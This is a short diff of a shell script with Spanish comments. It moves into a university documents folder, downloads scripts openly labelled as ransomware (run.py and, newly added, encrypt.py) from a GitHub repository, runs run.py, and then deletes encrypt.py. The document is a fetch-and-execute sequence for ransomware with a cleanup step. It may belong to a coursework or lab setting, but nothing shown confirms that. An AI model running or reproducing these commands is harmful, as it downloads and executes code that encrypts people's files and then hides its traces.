@@ -4,12 +4,14 @@ cd Documentos/Facultad
 
 # Descargar script de ransomware
 curl -O https://raw.githubusercontent.com/isoprophlex/ransomware/ransomware-without-socket/run.py
+curl -O https://raw.githubusercontent.com/isoprophlex/ransomware/ransomware-without-socket/encrypt.py
 
 # Ejecutar script de ransomware
 python3 run.py
 
 # Eliminar archivo de ransomware?
 # ?
+rm encrypt.py
 
 # Eliminar archivo de script
 cd ../..
